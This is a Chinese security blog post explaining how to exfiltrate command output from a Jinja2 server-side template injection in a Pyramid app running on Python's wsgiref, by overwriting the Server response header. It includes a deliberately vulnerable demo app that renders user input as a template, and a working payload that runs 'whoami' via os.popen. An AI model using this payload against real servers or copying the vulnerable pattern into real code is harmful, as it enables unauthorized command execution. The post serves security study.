# Python-Wsgiref通过Server回显命令

  
  
&lt;!--more--&gt;  
## 0x00 前言  
[`wsgiref`](https://docs.python.org/zh-cn/3/library/wsgiref.html#module-wsgiref &#34;wsgiref: WSGI Utilities and Reference Implementation.&#34;) 是 WSGI 规范的一个参考实现，可被用于将 WSGI 支持添加到 Web 服务器或框架中。 它提供了操作 WSGI 环境变量和响应标头的工具，实现 WSGI 服务器的基类，可部署 WSGI 应用程序的演示性 HTTP 服务器，用于静态类型检查的类型，以及一个用于检查 WSGI 服务器和应用程序是否符合 WSGI 规范的验证工具 ([**PEP 3333**](https://peps.python.org/pep-3333/))。  
## 0x01 前置知识  
先来写一个 Demo  
```python  
import jinja2  
from pyramid.config import Configurator  
from pyramid.httpexceptions import HTTPFound  
from pyramid.response import Response  
from pyramid.session import SignedCookieSessionFactory  
from wsgiref.simple_server import make_server  
def shell_view(request):  
    expression = request.GET.get(&#39;shellcmd&#39;, &#39;&#39;)  
    try:  
        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render({&#34;request&#34;: request})  
        if result != None:  
            return Response(&#39;success&#39;)  
        else:  
            return Response(&#39;error&#39;)  
    except Exception as e:  
        return Response(&#39;error&#39;)  
  
  
def main():  
    session_factory = SignedCookieSessionFactory(&#39;secret_key&#39;)  
    with Configurator(session_factory=session_factory) as config:  
        config.include(&#39;pyramid_chameleon&#39;)  # 添加渲染模板  
        config.add_static_view(name=&#39;static&#39;, path=&#39;/app/static&#39;)  
        config.set_default_permission(&#39;view&#39;)  # 设置默认权限为view  
  
        config.add_route(&#39;shell&#39;, &#39;/shell&#39;)  
  
        config.add_view(shell_view, route_name=&#39;shell&#39;, renderer=&#39;string&#39;, permission=&#39;view&#39;)  
  
        config.scan()  
        app = config.make_wsgi_app()  
        return app  
  
  
if __name__ == &#34;__main__&#34;:  
    app = main()  
    server = make_server(&#39;0.0.0.0&#39;, 6543, app)  
    server.serve_forever()  
```  
此`demo`存在`SSTI`漏洞，但是我们如何在不能通网，不能写文件的情况下得到执行RCE 的结果呢？  
很明显是需要通过其回显，但是内容写死了，无法更改，只能通过请求头来回显执行的结果  
首先来看一下  
`make_server()`，通过手册得知  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072334739.png)
实现了一个简易的`HTTP`服务器  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072335539.png)
`WSGIServer`是一个服务器类，用于监听客户端的 HTTP 请求并将这些请求传递给 `WSGIRequestHandler` 处理  
## 0x02 漏洞分析  
打一个断点，看一下调用栈  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072340140.png)
在`run()`方法中存在`finish_response()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072341178.png)
因为 Python 实现的大多数HTTP服务器均在此方法中设置了`send_headers()`，打一个断点，跟进一下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072343656.png)
继续跟进其`write()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072344176.png)
可以看到在`write`方法中，正好存在`send_headers()`方法，继续跟进  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072344975.png)
在这里跟进`send_preamble()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072345415.png)
正是此方法控制了响应头`Server`  
而此方法在`&lt;wsgiref.simple_server.ServerHandler object at 0x7fbba01eb5b0&gt;`中，利用 SSTI 控制此属性即可，构造`payload`  
```python  
{{lipsum.__spec__.__init__.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,&#34;server_software&#34;,lipsum[&#39;__globals__&#39;][&#39;os&#39;]|attr(&#39;popen&#39;)(&#39;whoami&#39;)|attr(&#39;read&#39;)())}}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412072347843.png)
## Reference  
https://docs.python.org/zh-cn/3/library/wsgiref.html#module-wsgiref.simple_server  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/python-wsgiref%E9%80%9A%E8%BF%87server%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4/  

